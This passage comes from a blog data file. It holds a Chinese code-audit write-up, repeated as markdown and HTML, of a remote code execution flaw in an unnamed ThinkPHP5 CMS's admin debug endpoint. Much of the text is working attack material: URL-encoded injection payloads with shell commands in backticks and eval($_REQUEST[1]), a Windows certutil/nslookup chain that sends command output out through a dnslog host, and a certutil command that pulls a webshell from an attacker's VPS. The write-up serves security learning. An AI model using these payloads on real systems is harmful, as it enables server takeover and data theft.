123.yh6nta.dnslog.cn`;//\n#url编码\n123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F\n```\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F\n```\n查看文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976148195-6af4632a-25e2-4522-b675-1534d18406cb.png#align=left&display=inline&height=157&margin=%5Bobject%2Object%5D&name=image.png&originHeight=314&originWidth=1460&size=22879&status=done&style=none&width=730)\n```php\n<?php return ['name'=>'123']&`ping 123.yh6nta.dnslog.cn`;//',]; \n```\n访问debug.php文件，页面没有报错，而且dnslog成功回显\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976190829-597fc4be-908f-4c66-a852-bdc93422099e.png#align=left&display=inline&height=212&margin=%5Bobject%2Object%5D&name=image.png&originHeight=424&originWidth=1048&size=19358&status=done&style=none&width=524)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976225056-8a0f56dd-89e0-44fd-8bda-f6c928a1ffb3.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1636&size=71050&status=done&style=none&width=818)\n4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢\nPHP无回显情况下的渗透测试可以参考此文章：\n[https://xz.aliyun.com/t/9916](https://xz.aliyun.com/t/9916)\n### Linux系统\n```php\n这里不细说，只要命令没有<、>、?即可\n1、nc反弹shell\n2、配合其他组件，如redis等\n3、等等～\n```\n### Windows系统\n#### 1、第一次尝试\n```php\n使用`ping `whoami`.yh6nta.dnslog.cn`，失败\n使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败\n使用`ping %系统变量%.yh6nta.dnslog.cn`，失败\n```\n#### 2、第二次尝试\n使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据\n```php\n<?php return ['name'=>'123']&`cmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.yh6nta.dnslog.cn)&del temp`;//',]; \n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977290414-50582704-a650-4082-a41a-cf9a1665b9b9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&name=image.png&originHeight=414&originWidth=1540&size=39360&status=done&style=none&width=770)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977306573-d1cd453b-5141-4d0b-9168-b691f744965b.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=292&originWidth=1470&size=47685&status=done&style=none&width=735)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977330429-234914f7-3549-4c6c-a3b9-6167a5649897.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=1130&size=61783&status=done&style=none&width=565)\n后面发现，这条命令中含有一个>号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。\n#### 3、第三次尝试，成功getshell\n这里借鉴了XX师傅的建议，通过命令下载文件getshell\n\n\n1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。）\n\n\n2、windows中可以使用certutil下载文件\n```php\n#payload：\n']&`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//\n#url编码：\n%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F\n#通过id传参：\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977842733-531b6b12-9c1d-437f-b7eb-43c9f4d2f586.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1924&size=52188&status=done&style=none&width=962)\n3、查看debug.php文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977879453-9011b19e-b726-40d9-8d0b-d2f3f11814b6.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&name=image.png&originHeight=340&originWidth=1370&size=27921&status=done&style=none&width=685)\n4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978056537-80fdfb3f-2da0-4272-86ce-13fc3301fe3c.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1340&size=52951&status=done&style=none&width=670)\n5、执行phpinfo函数\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978130967-fe3d3a57-3439-4ae1-93af-1f1c0df55acb.png#align=left&display=inline&height=423&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=2230&size=218961&status=done&style=none&width=1115)\n\n\n## 原来竟然如此简单？\n1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&、&&，只有&和&&的时候可以执行）\n同样先进行url编码\n```php\n123']&&eval($_REQUEST[1]);//\n#url编码\n123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F\n```\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974884495-55623576-d417-48df-b872-bf0ba605d607.png#align=left&display=inline&height=248&margin=%5Bobject%2Object%5D&name=image.png&originHeight=496&originWidth=1940&size=47452&status=done&style=none&width=970)\n在文件中是这样的\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974919229-adbc9a6d-0ff1-4971-96e4-a0a08b7064a5.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=1288&size=19624&status=done&style=none&width=644)\n```php\n<?php return ['name'=>'123']&&eval($_REQUEST[1]);//',]; \n```\n尝试访问，成功执行代码\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974971491-f1514597-7cb7-43ac-a727-8c191adf1d0e.png#align=left&display=inline&height=497&margin=%5Bobject%2Object%5D&name=image.png&originHeight=994&originWidth=2474&size=252996&status=done&style=none&width=1237)\n居然就这样就可以了……\n# 0x06 总结\n本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！\n","source":"_posts/某cms代码审计RCE&艰难bypass(思路清奇).md","raw":"---\ntitle: 某cms代码审计RCE&艰难bypass(思路清奇)\ntags: \n  - cms\n  - 代码审计\n  - bypass\n  - php\ncategories: 代码审计\nkeywords: 'cms,代码审计,bypass,php'\ndescription: 对某cms进行一次代码审计bypass\ncover: https://img0.baidu.com/it/u=751296986,1439230770&fm=253&fmt=auto&app=120&f=JPEG?w=650&h=407\ndata: 2021-08-05 10:00:00\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9990\n>\n> 作者：ajie\n\n# 0x01 前言\n\n闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～\n思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～\n# 0x02 代码审计环境\n此次代码审计采用的是phpstudy一键式搭建。\nphpstudy下载地址：[https://www.xp.cn/download.html](https://www.xp.cn/download.html)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971325439-22769cc2-8d3c-41a2-8185-4678214b0b6b.png)\n代码审计分析工具：nopad++，seay源代码分析工具\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971466153-651305cf-f199-4ad4-86c8-9599bda20d95.png#align=left&display=inline&height=486&margin=%5Bobject%2Object%5D&name=image.png&originHeight=972&originWidth=2022&size=139166&status=done&style=none&width=1011)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971389181-eb803d39-5a81-48d8-ac70-ffc28257b6da.png#align=left&display=inline&height=571&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=2388&size=356754&status=done&style=none&width=1194)\n\n# 0x03 开始审计\n话不多说，先看一下目录结构，很明显的tp5框架\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972430124-8e7c7656-9fa6-4359-a4e3-6543904ec4ce.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=956&size=48969&status=done&style=none&width=478)\n在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972568248-ebb5d28f-a552-4570-92f2-57121b18ba68.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1238&size=96549&status=done&style=none&width=619)\n虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972380570-1f206c81-580c-4d1c-bd47-71132c722f9b.png#align=left&display=inline&height=652&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1304&originWidth=2424&size=273863&status=done&style=none&width=1212)\n接下来就是一个个漏洞分析了，都点进去看一看。\n其实只需要看2点：\n1.用户可以控制输入的内容\n2.输入的内容被放到危险函数中进行了执行\n(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替)\n\n# 0x04 漏洞点分析\n1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972756885-5eac5c3d-6c8e-46ff-9a13-4914400c87c7.png#align=left&display=inline&height=331&margin=%5Bobject%2Object%5D&name=image.png&originHeight=662&originWidth=1360&size=59767&status=done&style=none&width=680)\n```php\npublic function debug()\n    {\n        $path = 'app/extra/debug.php';\n        $file = include $path; \n        $config = array(\n         'name' => input('id'),\n        );\n        $config = preg_replace(\"/[?><?]/\", '', $config);\n        $res = array_merge($file, $config);\n        $str = '<?php return [';\n        foreach ($res as $key => $value) {\n            $str .= '\\'' . $key . '\\'' . '=>' . '\\'' . $value . '\\'' . ',';\n        }\n        $str .= ']; ';\n        if (file_put_contents($path, $str)) {\n            return json(array('code' => 1, 'msg' => '操作成功'));\n        } else {\n            return json(array('code' => 0, 'msg' => '操作失败'));\n        }\n    }\n```\n在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。\n2、可以看到上面进行了一些过滤，将<>和?替换为空\n```php\n$config = preg_replace(\"/[?><?]/\", '', $config);\n```\n3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。\n[http://127.0.0.1/index.php/admin/](http://127.0.0.1/index.php/admin/)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973358124-c7069db1-627c-4b05-8d15-255493426fee.png#align=left&display=inline&height=378&margin=%5Bobject%2Object%5D&name=image.png&originHeight=756&originWidth=2250&size=114711&status=done&style=none&width=1125)\n4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。\n这里我传参123进行测试\n[http://127.0.0.1/index.php/admin-api-debug.html?id=123](http://127.0.0.1/index.php/admin-api-debug.html?id=123)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973462857-ae631d20-59ff-4a98-bb1d-6702c09d8311.png#align=left&display=inline&height=227&margin=%5Bobject%2Object%5D&name=image.png&originHeight=454&originWidth=1120&size=27749&status=done&style=none&width=560)\n5、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973579521-fd2d20ba-4b8c-46b5-9edf-654fb073cfed.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=810&size=11511&status=done&style=none&width=405)\n```php\n<?php return ['name'=>'123',]; \n```\n6、下面讲解我进行绕过的思路以及遇到的坑。\n# 0x05 绕过思路\n## 第一次踩坑\n1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合\n```php\npayload:\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();//\n```\n这里可以看到数据是成功写入进文件中的\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973910607-7d1ffe2f-30b8-406c-9ec6-a7f233aa1838.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1138&size=17735&status=done&style=none&width=569)\n```php\n<?php return ['name'=>'123'];phpinfo();//',]; \n```\n2、访问debug.php文件试试发现，页面并没有返回想要的内容\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973998766-06dfe807-2a84-4b08-9d12-f6f666c5d553.png#align=left&display=inline&height=363&margin=%5Bobject%2Object%5D&name=image.png&originHeight=726&originWidth=1882&size=36793&status=done&style=none&width=941)\n3、这里我想了好久，想着试试更换echo输出看看\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974252476-7716d00d-14a0-4716-b201-a544a6f60a7b.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1216&size=17745&status=done&style=none&width=608)\n```php\n<?php return ['name'=>'123'];echo '12344321';//',]; \n```\n在页面中并没有输出\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974272002-aae9ec72-7aef-4da2-9334-3b1d52dd1fdc.png#align=left&display=inline&height=349&margin=%5Bobject%2Object%5D&name=image.png&originHeight=698&originWidth=1572&size=32195&status=done&style=none&width=786)\n4、查阅资料之后理解了return后代码不再向下执行，此路不通\n参考链接：[https://www.cnblogs.com/gzpu/p/13736420.html](https://www.cnblogs.com/gzpu/p/13736420.html)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974368673-8697062b-c811-4893-8104-93859af43ce4.png#align=left&display=inline&height=360&margin=%5Bobject%2Object%5D&name=image.png&originHeight=720&originWidth=1780&size=173801&status=done&style=none&width=890)\n## 第二次踩坑\n1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974559232-6d36dadf-930e-47a1-9480-1ec1a7fedfff.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1320&size=21063&status=done&style=none&width=660)\n```php\n<?php return ['name'=>'123',eval($_REQUEST[1]);'',]; \n```\n于是……页面报错了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974695282-85560a7a-e2ed-420b-a587-3fca009fce13.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)\n2、再试试换行\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974633748-97685352-f49d-473f-8a3b-2bee5cd0f9f9.png#align=left&display=inline&height=255&margin=%5Bobject%2Object%5D&name=image.png&originHeight=510&originWidth=1766&size=41682&status=done&style=none&width=883)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974665241-8ade3301-0ef4-4c8e-81c7-ed35aaf695d6.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=774&size=17721&status=done&style=none&width=387)\n好的，还是不执行\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974689654-d9f1edad-993c-47cf-bd87-4a90e81ca765.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)\n## 第三次，渐渐好起来了\n1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：[http://dnslog.cn/](http://dnslog.cn/)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975381688-d15ad1b7-76f1-415d-bcd7-e22aa5ba1eb6.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1678&size=96742&status=done&style=none&width=839)\n2、使用.拼接反引号执行命令\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;//\n```\n查看文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975963563-5fcf69e0-c0a5-4b5c-a539-91dc15f8ed2b.png#align=left&display=inline&height=130&margin=%5Bobject%2Object%5D&name=image.png&originHeight=260&originWidth=1520&size=21022&status=done&style=none&width=760)\n```php\n<?php return ['name'=>'123'].`ping 123.yh6nta.dnslog.cn`;//',]; \n```\n访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975999637-a25ee21b-1180-4e35-b011-5cfd6aa1b280.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=410&originWidth=1638&size=42918&status=done&style=none&width=819)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976022017-93c02bcb-6de0-4975-9a73-97abf75fcd0d.png#align=left&display=inline&height=243&margin=%5Bobject%2Object%5D&name=image.png&originHeight=486&originWidth=1562&size=52679&status=done&style=none&width=781)\n\n\n3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&。\n因为&在url中还有其他含义，所以先进行url编码。\n```php\n123']&`ping 123.yh6nta.dnslog.cn`;//\n#url编码\n123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F\n```\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F\n```\n查看文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976148195-6af4632a-25e2-4522-b675-1534d18406cb.png#align=left&display=inline&height=157&margin=%5Bobject%2Object%5D&name=image.png&originHeight=314&originWidth=1460&size=22879&status=done&style=none&width=730)\n```php\n<?php return ['name'=>'123']&`ping 123.yh6nta.dnslog.cn`;//',]; \n```\n访问debug.php文件，页面没有报错，而且dnslog成功回显\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976190829-597fc4be-908f-4c66-a852-bdc93422099e.png#align=left&display=inline&height=212&margin=%5Bobject%2Object%5D&name=image.png&originHeight=424&originWidth=1048&size=19358&status=done&style=none&width=524)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976225056-8a0f56dd-89e0-44fd-8bda-f6c928a1ffb3.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1636&size=71050&status=done&style=none&width=818)\n4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢\nPHP无回显情况下的渗透测试可以参考此文章：\n[https://xz.aliyun.com/t/9916](https://xz.aliyun.com/t/9916)\n### Linux系统\n```php\n这里不细说，只要命令没有<、>、?即可\n1、nc反弹shell\n2、配合其他组件，如redis等\n3、等等～\n```\n### Windows系统\n#### 1、第一次尝试\n```php\n使用`ping `whoami`.yh6nta.dnslog.cn`，失败\n使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败\n使用`ping %系统变量%.yh6nta.dnslog.cn`，失败\n```\n#### 2、第二次尝试\n使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据\n```php\n<?php return ['name'=>'123']&`cmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.yh6nta.dnslog.cn)&del temp`;//',]; \n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977290414-50582704-a650-4082-a41a-cf9a1665b9b9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&name=image.png&originHeight=414&originWidth=1540&size=39360&status=done&style=none&width=770)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977306573-d1cd453b-5141-4d0b-9168-b691f744965b.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=292&originWidth=1470&size=47685&status=done&style=none&width=735)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977330429-234914f7-3549-4c6c-a3b9-6167a5649897.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=1130&size=61783&status=done&style=none&width=565)\n后面发现，这条命令中含有一个>号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。\n#### 3、第三次尝试，成功getshell\n这里借鉴了XX师傅的建议，通过命令下载文件getshell\n\n\n1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。）\n\n\n2、windows中可以使用certutil下载文件\n```php\n#payload：\n']&`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//\n#url编码：\n%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F\n#通过id传参：\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977842733-531b6b12-9c1d-437f-b7eb-43c9f4d2f586.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1924&size=52188&status=done&style=none&width=962)\n3、查看debug.php文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977879453-9011b19e-b726-40d9-8d0b-d2f3f11814b6.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&name=image.png&originHeight=340&originWidth=1370&size=27921&status=done&style=none&width=685)\n4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978056537-80fdfb3f-2da0-4272-86ce-13fc3301fe3c.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1340&size=52951&status=done&style=none&width=670)\n5、执行phpinfo函数\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978130967-fe3d3a57-3439-4ae1-93af-1f1c0df55acb.png#align=left&display=inline&height=423&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=2230&size=218961&status=done&style=none&width=1115)\n\n\n## 原来竟然如此简单？\n1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&、&&，只有&和&&的时候可以执行）\n同样先进行url编码\n```php\n123']&&eval($_REQUEST[1]);//\n#url编码\n123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F\n```\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974884495-55623576-d417-48df-b872-bf0ba605d607.png#align=left&display=inline&height=248&margin=%5Bobject%2Object%5D&name=image.png&originHeight=496&originWidth=1940&size=47452&status=done&style=none&width=970)\n在文件中是这样的\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974919229-adbc9a6d-0ff1-4971-96e4-a0a08b7064a5.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=1288&size=19624&status=done&style=none&width=644)\n```php\n<?php return ['name'=>'123']&&eval($_REQUEST[1]);//',]; \n```\n尝试访问，成功执行代码\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974971491-f1514597-7cb7-43ac-a727-8c191adf1d0e.png#align=left&display=inline&height=497&margin=%5Bobject%2Object%5D&name=image.png&originHeight=994&originWidth=2474&size=252996&status=done&style=none&width=1237)\n居然就这样就可以了……\n# 0x06 总结\n本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！\n","slug":"某cms代码审计RCE&艰难bypass(思路清奇)","published":1,"date":"2021-08-03T08:20:43.038Z","updated":"2021-08-26T03:36:26.678Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgm005evkq3byat6sm1","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9990\">https://xz.aliyun.com/t/9990</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～<br>思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～</p>\n<h1 id=\"0x02-代码审计环境\"><a href=\"#0x02-代码审计环境\" class=\"headerlink\" title=\"0x02 代码审计环境\"></a>0x02 代码审计环境</h1><p>此次代码审计采用的是phpstudy一键式搭建。<br>phpstudy下载地址：<a href=\"https://www.xp.cn/download.html\">https://www.xp.cn/download.html</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971325439-22769cc2-8d3c-41a2-8185-4678214b0b6b.png\" alt=\"image.png\"><br>代码审计分析工具：nopad++，seay源代码分析工具<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971466153-651305cf-f199-4ad4-86c8-9599bda20d95.png#align=left&display=inline&height=486&margin=%5Bobject%2Object%5D&name=image.png&originHeight=972&originWidth=2022&size=139166&status=done&style=none&width=1011\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971389181-eb803d39-5a81-48d8-ac70-ffc28257b6da.png#align=left&display=inline&height=571&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=2388&size=356754&status=done&style=none&width=1194\" alt=\"image.png\"></p>\n<h1 id=\"0x03-开始审计\"><a href=\"#0x03-开始审计\" class=\"headerlink\" title=\"0x03 开始审计\"></a>0x03 开始审计</h1><p>话不多说，先看一下目录结构，很明显的tp5框架<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972430124-8e7c7656-9fa6-4359-a4e3-6543904ec4ce.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=956&size=48969&status=done&style=none&width=478\" alt=\"image.png\"><br>在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972568248-ebb5d28f-a552-4570-92f2-57121b18ba68.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1238&size=96549&status=done&style=none&width=619\" alt=\"image.png\"><br>虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972380570-1f206c81-580c-4d1c-bd47-71132c722f9b.png#align=left&display=inline&height=652&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1304&originWidth=2424&size=273863&status=done&style=none&width=1212\" alt=\"image.png\"><br>接下来就是一个个漏洞分析了，都点进去看一看。<br>其实只需要看2点：<br>1.用户可以控制输入的内容<br>2.输入的内容被放到危险函数中进行了执行<br>(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替)</p>\n<h1 id=\"0x04-漏洞点分析\"><a href=\"#0x04-漏洞点分析\" class=\"headerlink\" title=\"0x04 漏洞点分析\"></a>0x04 漏洞点分析</h1><p>1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972756885-5eac5c3d-6c8e-46ff-9a13-4914400c87c7.png#align=left&display=inline&height=331&margin=%5Bobject%2Object%5D&name=image.png&originHeight=662&originWidth=1360&size=59767&status=done&style=none&width=680\" 